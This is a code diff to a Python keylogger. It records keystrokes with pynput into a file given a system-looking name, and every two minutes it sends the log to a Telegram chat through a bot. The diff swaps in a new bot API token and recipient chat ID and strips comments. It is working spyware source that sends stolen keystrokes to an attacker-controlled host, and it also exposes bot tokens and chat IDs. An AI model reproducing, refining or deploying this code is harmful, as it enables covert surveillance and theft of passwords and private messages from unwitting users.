@@ -4,13 +4,13 @@ import threading
 import telebot
 from pynput.keyboard import Key, Listener
 
-API_TOKEN = '6071630449:AAHslhDKXn83m8gsfsB8m4_hQvw9-9N5pWE'
+
+API_TOKEN = '6582521140:AAFGEqmfH0NOg47egJBL17V6k2x8xDBYjOk'
 file_path = "C:\\Pythons\\System\\System32.txt"
 
 bot = telebot.TeleBot(API_TOKEN)
 
 
-# Key logging functionality
 def on_key_press(key):
     with open(file_path, 'a') as logKey:
         try:
@@ -28,7 +28,7 @@ key_listener = Listener(on_press=on_key_press)
 
 
 def send_message_periodically():
-    first_run = True  # To track if it's the first run
+    first_run = True
     while True:
         if not os.path.exists(file_path):
             with open(file_path, 'w') as start_file:
@@ -39,9 +39,9 @@ def send_message_periodically():
                 if first_run and not file_contents.strip():
                     with open(file_path, 'w') as start_file:
                         start_file.write('start')
-                    first_run = False  # Mark the first run as completed
-                bot.send_message('973147838', file_contents)
-                # bot.send_message('717470905', file_contents) # id mihail
+                    first_run = False
+                bot.send_message('5692953878', file_contents)
+
             except Exception as e:
                 print('Error:', str(e))
         time.sleep(120)
